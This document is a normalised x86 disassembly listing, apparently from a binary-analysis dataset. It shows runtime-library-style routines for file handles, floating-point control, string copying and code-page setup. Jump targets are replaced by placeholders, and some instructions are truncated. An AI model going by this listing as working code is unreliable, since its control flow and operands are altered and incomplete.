pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_410abc
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_40e6df
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_410abc
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_40e41b
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_4123d8
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_411471
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_4114bc
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_41154e
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_4114bc
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_41154e
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_4115d7
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_411620
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_41251e
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_41251e
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_411676
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_4115d7
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_411620
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_411702
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_411729
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_411744
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_4117d1
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_411702
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_411676
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_411729
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_41171d
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41171d
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_411702
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_411744
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_411676
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_411744
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_411744
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_41171d
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_411744
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_411969
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4126bf
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_41193d
add esp 0x24
leave
retn
sub_411996
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4126bf
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_411953
add esp 0x24
leave
retn
sub_4119d0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4119e0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_411ac0
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_410c80
inc eax
push eax
push edi
push esi
call sub_410770
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_411b37
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_411b9b
pop ecx
lea esi [ ebp - 0xc ]
pop ecx
push rw-data
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_412b90
mov [ rw-data ] eax
add esp 0x18
movsx eax [ rw-data ]
mov [ rw-data ] eax
pop edi
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] rw-data
mov eax rw-data
pop esi
leave
retn
sub_411b9b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_411c6b
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_411c9c
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_411e35
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_411eb2
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_411e7f
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_411edb
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_411e7f
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_411e35
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_411e7f
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_411eb2
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_411edb
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_410e55
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40e157
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40e157
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_41207c
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_412110
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_41220e
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_41233b
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_40fb2e
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_41233b
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_412380
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_40c3b7
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40c7f4
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_4123d8
push ebp
mov ebp esp
mov eax 0x1000
call sub_40c910
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_410abc
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_410abc
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_40ce70
push 0x8000
push ebx
